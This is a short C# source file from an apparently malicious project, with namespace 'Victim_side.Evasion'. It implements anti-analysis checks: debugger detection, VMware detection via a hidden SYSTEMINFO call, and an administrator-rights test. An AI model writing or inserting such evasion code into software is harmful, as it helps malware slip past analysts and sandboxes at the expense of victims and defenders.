using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace ConsoleApp1.Victim_side.Evasion;

internal class Evasion
{
	[DllImport("Kernel32.dll")]
	private static extern bool IsDebuggerPresent();

	[DllImport("Kernel32.dll")]
	private static extern void OutputDebugString(string x);

	[DllImport("Kernel32.dll")]
	private static extern uint GetLastError();

	[DllImport("Kernel32.dll")]
	private static extern void SetLastError(int word);

	public DebuggerLevel CheckDebuggerLevel()
	{
		if (IsDebuggerPresent())
		{
			return DebuggerLevel.PRESENT;
		}
		SetLastError(1234);
		OutputDebugString("");
		if ((long)GetLastError() == 1234L)
		{
			return DebuggerLevel.SEMI_HIDDEN;
		}
		return DebuggerLevel.NOT_PRESENT;
	}

	public bool checkVM()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd", "/c SYSTEMINFO");
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
		string text = process.StandardOutput.ReadToEnd();
		if (text.Contains("VMware"))
		{
			return true;
		}
		return false;
	}

	public static bool IsAdministrator()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}
}
